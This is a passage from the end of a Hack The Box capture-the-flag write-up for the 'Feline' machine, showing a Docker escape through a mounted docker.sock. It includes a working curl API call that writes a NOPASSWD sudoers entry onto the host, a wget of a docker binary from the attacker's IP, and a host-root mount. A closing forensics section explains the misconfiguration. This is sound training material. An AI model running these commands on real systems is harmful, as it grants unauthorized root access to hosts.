+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@2d24bf61767c:~#</span><span class="w"> </span><span class="nb">id</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="nt">-s</span> <span class="nt">-X</span> <span class="s1">'POST'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">--data-binary</span> <span class="s1">'{"Image": "sandbox:latest","HostConfig": {"Binds": ["/:/rootfs"]}, "Cmd": ["/bin/sh", "-c", "echo \"tomcat ALL=(ALL) NOPASSWD:ALL\" &gt;&gt; /rootfs/etc/sudoers"], "Tty": true}'</span> http://localhost/containers/create | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'"'</span> <span class="nt">-f4</span><span class="si">)</span><span class="p">;</span> curl <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> http://localhost
+<span class="go">/containers/${id}/start; curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/${id}/logs?stderr=1&amp;stdout=1"
+</span></code></pre></div></div>
+<p>Once I run that, back at a tomcat shell, I can <code class="language-plaintext highlighter-rouge">sudo su</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tomcat@VirusBucket:/dev/shm$</span><span class="w"> </span><span class="nb">sudo </span>su
+<span class="go">root@VirusBucket:/dev/shm#
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="docker-binary">docker Binary</h3>
+<p>After solving, I later learned I could have just skipped the API all together and used the <code class="language-plaintext highlighter-rouge">docker</code> binary. It’s not in the container, but there is a copy <a href="https://master.dockerproject.org/linux/x86_64/docker">on dockerproject.org</a>. I’ll download it to my box, and then use a Python webserver to upload it to the container.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@2d24bf61767c:~#</span><span class="w"> </span>wget 10.10.14.15/docker
+<span class="go">--2020-09-03 02:01:06--  http://10.10.14.15/docker
+Connecting to 10.10.14.15:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 53959101 (51M) [application/octet-stream]
+Saving to: ‘docker’
+
+docker              100%[===================&gt;]  51.46M  10.4MB/s    in 5.0s    
+
+2020-09-03 02:01:11 (10.3 MB/s) - ‘docker’ saved [53959101/53959101]
+
+</span><span class="gp">root@2d24bf61767c:~#</span><span class="w"> </span><span class="nb">chmod</span> +x docker
+</code></pre></div></div>
+<p>Now I can run a container the same way I have in other Docker privescs:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@2d24bf61767c:~#</span><span class="w"> </span>./docker run <span class="nt">-v</span> /:/rootfs <span class="nt">--rm</span> <span class="nt">-it</span> sandbox sh
+<span class="gp">/ #</span><span class="w">
+</span></code></pre></div></div>
+<p>The arguments are:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">-v /:rootfs</code> - map the hosts <code class="language-plaintext highlighter-rouge">/</code> to <code class="language-plaintext highlighter-rouge">/rootfs</code> in the container as a volume</li>
+<li><code class="language-plaintext highlighter-rouge">--rm</code> - remove the container when it exits</li>
+<li><code class="language-plaintext highlighter-rouge">-i</code> - interactive</li>
+<li><code class="language-plaintext highlighter-rouge">-t</code> - allocate a pseudo-TTY</li>
+<li><code class="language-plaintext highlighter-rouge">sandbox</code> - the name of the image to start</li>
+<li><code class="language-plaintext highlighter-rouge">sh</code> - the command to run in the container</li>
+</ul>
+<p>Once inside, I can find the file system just as before:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/ #</span><span class="w"> </span><span class="nb">cd </span>rootfs/
+<span class="gp">/rootfs #</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">bin         home        lost+found  root        swap.img
+boot        lib         media       run         sys
+cdrom       lib32       mnt         sbin        tmp
+dev         lib64       opt         snap        usr
+etc         libx32      proc        srv         var
+</span><span class="gp">/rootfs #</span><span class="w"> </span><span class="nb">cd </span>root/
+<span class="gp">/rootfs/root #</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">root.txt  snap
+</span></code></pre></div></div>
+<h3 id="forensics">Forensics</h3>
+<p>How is the container able to execute commands on the host? I was interactiving with <code class="language-plaintext highlighter-rouge">/var/run/docker.sock</code> in the container. With a root shell on Feline, I’ll investigate. I dropped a SSH key into <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code> and connected to Feline as root.</p>
+<p>To see running containers, I’ll run <code class="language-plaintext highlighter-rouge">docker ps</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@VirusBucket:~#</span><span class="w"> </span>docker ps
+<span class="go">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                                                  NAMES
+2d24bf61767c        188a2704d8b0        "/usr/bin/dumb-init …"   2 months ago        Up 10 hours         127.0.0.1:4505-4506-&gt;4505-4506/tcp, 22/tcp, 127.0.0.1:8000-&gt;8000/tcp   saltstack
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">docker inspect [container id]</code> will dump a <em>ton</em> of config information about the container. I’ll dump it to a file, and on searching for <code class="language-plaintext highlighter-rouge">docker.sock</code>, find this section:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"HostConfig"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"Binds"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="s2">"/var/run/docker.sock:/var/run/docker.sock"</span><span class="w">
+    </span><span class="p">],</span><span class="w">
+    </span><span class="nl">"ContainerIDFile"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"LogConfig"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">               
+        </span><span class="nl">"Type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"json-file"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"Config"</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
+    </span><span class="p">},</span><span class="w">                              
+    </span><span class="nl">"NetworkMode"</span><span class="p">:</span><span class="w"> </span><span class="s2">"default"</span><span class="p">,</span><span class="w">         
+    </span><span class="nl">"PortBindings"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"4505/tcp"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+            </span><span class="p">{</span><span class="w">
+                </span><span class="nl">"HostIp"</span><span class="p">:</span><span class="w"> </span><span class="s2">"127.0.0.1"</span><span class="p">,</span><span class="w">
+                </span><span class="nl">"HostPort"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4505"</span><span class="w">
+            </span><span class="p">}</span><span class="w">
+        </span><span class="p">],</span><span class="w">
+        </span><span class="nl">"4506/tcp"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+            </span><span class="p">{</span><span class="w">
+                </span><span class="nl">"HostIp"</span><span class="p">:</span><span class="w"> </span><span class="s2">"127.0.0.1"</span><span class="p">,</span><span class="w">
+                </span><span class="nl">"HostPort"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4506"</span><span class="w">
+            </span><span class="p">}</span><span class="w">
+        </span><span class="p">],</span><span class="w">
+        </span><span class="nl">"8000/tcp"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">        
+            </span><span class="p">{</span><span class="w">
+                </span><span class="nl">"HostIp"</span><span class="p">:</span><span class="w"> </span><span class="s2">"127.0.0.1"</span><span class="p">,</span><span class="w">
+                </span><span class="nl">"HostPort"</span><span class="p">:</span><span class="w"> </span><span class="s2">"8000"</span><span class="w">            
+            </span><span class="p">}</span><span class="w">
+        </span><span class="p">]</span><span class="w">
+    </span><span class="p">},</span><span class="w">
+    </span><span class="nl">"RestartPolicy"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"always"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"MaximumRetryCount"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w">
+    </span><span class="p">},</span><span class="w">
+</span></code></pre></div></div>
+<p>This looks familiar, as it’s the same section of options I provided the API when escalating. The various SaltStack ports are mapped through to the host. But so is <code class="language-plaintext highlighter-rouge">/var/run/docker.sock</code>, which is mapped to a file of the same name inside the container.</p>
+<p><a href="https://medium.com/better-programming/about-var-run-docker-sock-3bfd276e12fd">This Medium post</a> talks about <code class="language-plaintext highlighter-rouge">/var/run/docker.sock</code> and why you might map this file into a Docker container. If you want something from within the container to be able to control other containers, you have to give it some method to talk to the host system. This UNIX socket is how Docker takes commands and returns results.</p>
+<p>Looking at the file on Feline, I can see it’s owned by root and the docker group. This is standard, and what allows only root and docker users to start containers.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@VirusBucket:~#</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> /var/run/docker.sock 
+<span class="go">srw-rw---- 1 root docker 0 Sep  3 01:56 /var/run/docker.sock
+</span></code></pre></div></div>
+<p>Many articles about mapping <code class="language-plaintext highlighter-rouge">/var/run/docker.sock</code> into a container will say things like:</p>
+<blockquote>
+<p>This should only be done for trusted containers.</p>
+</blockquote>
+<p>That seems like a bit of an under-selling the risk to me. At the risk of jumping on a soapbox, if we’re learning anything following the news, there’s no such thing as a trusted computer. Defense in depth is built on making the attack go through many walls to get to the thing they want. And this just puts a door in one of them. Basically, if you can get access to that socket from within the container, you are as good as root on the host.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2021/02/20/htb-feline.html"></a>
+</article>
